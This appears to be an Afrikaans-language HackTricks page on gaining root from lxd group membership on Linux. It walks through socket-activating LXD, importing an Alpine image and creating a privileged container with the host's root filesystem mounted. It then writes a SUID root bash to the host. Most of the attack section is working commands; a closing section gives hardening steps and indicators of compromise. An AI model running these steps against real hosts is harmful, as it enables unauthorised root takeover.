# lxd/lxc-groep - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

Lidmaatskap van die gasheer se LXD-bestuursgroep (gewoonlik _**lxd**_) kan ’n pad na root bied deur volle beheer oor die daemon moontlik te maak.<sup>[[1]](#references)</sup> Dit is dieselfde vertrouensgrensprobleem wat beskryf word vir [runtime-beheersockets](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md) en [skryfbare gasheermonterings](../../containers-namespaces/container-security/sensitive-host-mounts.md): toegang tot die bestuurs-API kan voldoende wees, selfs wanneer die huidige proses nie reeds binne ’n container is nie.<sup>[[1]](#references)</sup>

## Ubuntu `lxd-installer` socket activation

Moenie aanvaar dat lidmaatskap van `lxd` onskadelik is bloot omdat die LXD-snap ontbreek nie. Op Ubuntu Server 24.04 en later stel die vooraf geïnstalleerde `lxd-installer`-pakket `/run/lxd-installer.socket` beskikbaar as `root:lxd` met modus `0660`. ’n Verbinding aktiveer `lxd-installer@.service` as root, wat die LXD-snap installeer sonder ’n sudo-wagwoord of polkit-magtiging; sommige weergawes van die wrapper slaan ook hul bevestigingsprompt oor wanneer standaardinvoer nie ’n TTY is nie.<sup>[[10]](#references)[[11]](#references)</sup>

Ondersoek beide die rekening se lidmaatskap en die socket-geaktiveerde diens:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

’n Gemagtigde toets deur ’n lid van die `lxd`-groep kan die installeerder aktiveer via die normale `lxc`-wrapper of deur direk aan die socket te koppel. Laasgenoemde wys dat die Unix-socket-ACL, eerder as die wrapper-prompt, die werklike magtigingsgrens is:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

Sodra die daemon beskikbaar is, gaan voort met die privileged-container-tegnieke hieronder.<sup>[[10]](#references)[[11]](#references)</sup>

## Exploiting sonder internet

### Method 1

Jy kan ’n Alpine image aflaai om saam met LXD te gebruik vanaf ’n vertroude repository.
Canonical se LXD image server publiseer daaglikse builds: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Laai eenvoudig beide **lxd.tar.xz** en **rootfs.squashfs** van die nuutste build af (die gidsnaam is die datum).<sup>[[8]](#references)</sup>

Alternatiewelik kan jy distrobuilder op jou masjien installeer deur die [projekinstruksies](https://github.com/lxc/distrobuilder) te volg.<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

Laai **incus.tar.xz** (**lxd.tar.xz** as jy van die Canonical image server afgelaai het) en **rootfs.squashfs** op, voer dan die image in en skep ’n container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> As jy hierdie fout kry _**Error: No storage pool found. Please create a new storage pool**_\
> Voer **`lxd init`** uit, stel ’n verstekbergingpoel op en **herhaal** dan die vorige groep opdragte.<sup>[[2]](#references)</sup>

Begin laastens die container en maak ’n root-shell op die gasheerlêerstelsel oop:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

Omdat UID 0 in hierdie bevoorregte instansie nie herkarteer word nie, kan dit via die gemonteerde wortel van die gasheer ’n SUID-payload skep wat aan die gasheer behoort. Dit voltooi die container-to-host-pivot, eerder as om die operateur in ’n containershell te laat:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

Plaas die payload op ’n lêerstelsel wat SUID respekteer. ’n Afsonderlike `/tmp` word dikwels met `nosuid` gemonteer en verskyn moontlik nie onder ’n nie-rekursiewe bind van die gasheer se `/` nie, dus is ’n pad soos `/rootbash` op die gasheer se wortellêerstelsel betroubaarder vir hierdie bewys.<sup>[[10]](#references)[[11]](#references)</sup>

### Method 2

Bou ’n Alpine-image en begin dit met die vlag `security.privileged=true`, wat container-root na gasheer-root karteer; die montering van `/` stel dan die gasheer se lêerstelsel binne die container bloot.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## AppArmor-neweffek wat die hele gasheer raak

Die LXD-snap kan ook `/run/sysctl.d/zz-lxd.conf` skryf en beide `kernel.apparmor_restrict_unprivileged_userns` en `kernel.apparmor_restrict_unprivileged_unconfined` op `0` stel. Dit verswak Ubuntu se beperkings op naamruimtes vir onbevoorregte gebruikers vir elke plaaslike gebruiker. Teken dus die waardes op voordat en nadat LXD geaktiveer word wanneer jy die gasheer beoordeel.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## Oudit en verharding

Beskou lidmaatskap van `lxd` as ’n root-toekenning. Die verwydering van ’n onnodige lid tree vir nuwe aanmeldingsessies in werking; die suiwering van `lxd-installer` of die maskering van sy socket verwyder slegs die installasieroete op aanvraag en beperk **nie** ’n gebruiker wat reeds toegang tot ’n geïnstalleerde LXD-daemon het nie.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

Nuttige kompromie-aanwysers sluit LXD-instansies met `security.privileged=true`, skyftoestelle waarvan `source` `/` is, onverwagte verbindings na `/run/lxd-installer.socket`, nuwe SUID-lêers en ’n verandering van die AppArmor-sysctls hierbo van `1` na `0` in.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [Hoe om sekuriteit vir LXD te verhard](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD-houers en virtuele masjiene](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Hoe om images te kopieer en in te voer](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Hoe om images met distrobuilder te bou](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Alpine-image-definisie](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [lxd-alpine-builder-bouskrip](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD-imagebediener](https://images.lxd.canonical.com/)
- [9] [Tipe: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [STAR Labs-verslag en PoC oor voorregte-eskalasie in die LXD-groep](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [Ou wyn in ’n nuwe bottel: ’n dekade-oue LXD-groep se root-voorregte herbewapen](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)
{{#include ../../../banners/hacktricks-training.md}}
